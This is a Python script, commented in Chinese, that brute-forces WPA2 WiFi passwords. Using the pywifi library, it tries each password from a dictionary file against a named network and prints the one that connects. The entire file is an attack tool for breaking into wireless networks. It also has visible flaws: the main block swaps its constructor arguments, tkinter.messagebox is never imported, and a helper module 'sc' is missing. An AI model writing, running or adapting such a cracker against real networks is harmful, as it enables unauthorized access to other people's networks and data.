# coding:utf-8
import time  #时间
import pywifi  #破解wifi
import tkinter
import sc   #扫描wifi

from pywifi import const  #引用一些定义

class wifiError(Exception):     #异常
    pass

    '''
    def __init__(self,msg):
        self.msg = msg
        print("执行el"+str(self.msg))

    def __srt__(self):
        print("执行")
        return str(self.msg)
    '''

class PoJie():
    def __init__(self,ssid,path = None):
        if path:
            self.file=open(path,"r",errors="ignore")
        else:self.file = None
        self.ssid = ssid
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接
    
        time.sleep(1) #休眠1秒
    
        #测试网卡是否属于断开状态
        try:
            assert self.iface.status() in\
                [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]    #如果网卡未断开 抛出异常
        except AssertionError:
            tkinter.messagebox.showinfo("提示","wifi接口异常")
            exit()
            

    def readPassWord(self):
            
            print("开始破解：")

            while True:
                try:
                    myStr =self.file.readline() #读取字典文件
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr)
                    if bool1:
                        print("密码正确：",myStr)
                        break
                    else:
                        print("密码错误:"+myStr)
                    #time.sleep(1)
                except wifiError:
                    return -1
                except:
                    continue


    #成功返回真 失败返回假 wifi消失抛出异常              
    def test_connect(self,findStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid = self.ssid #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr   #密码
    
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的连接文件
        self.iface.connect(tmp_profile) #连接wifi
        
        if sc.scann(self.iface,self.ssid) == -1:
            raise wifiError    #wifi消失
            
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True
        else:
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        
        #检查断开状态
        try:
            assert self.iface.status() in\
                [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        except AssertionError:
            tkinter.messagebox.showinfo("提示","wifi接口异常")
            exit()
        
        return isOK
    

    def __del__(self):
        if self.file:
            self.file.close()
        

if __name__ == '__main__':   
    path=r"字典.txt"
    start=PoJie(path,'XT')
    start.readPassWord()
    

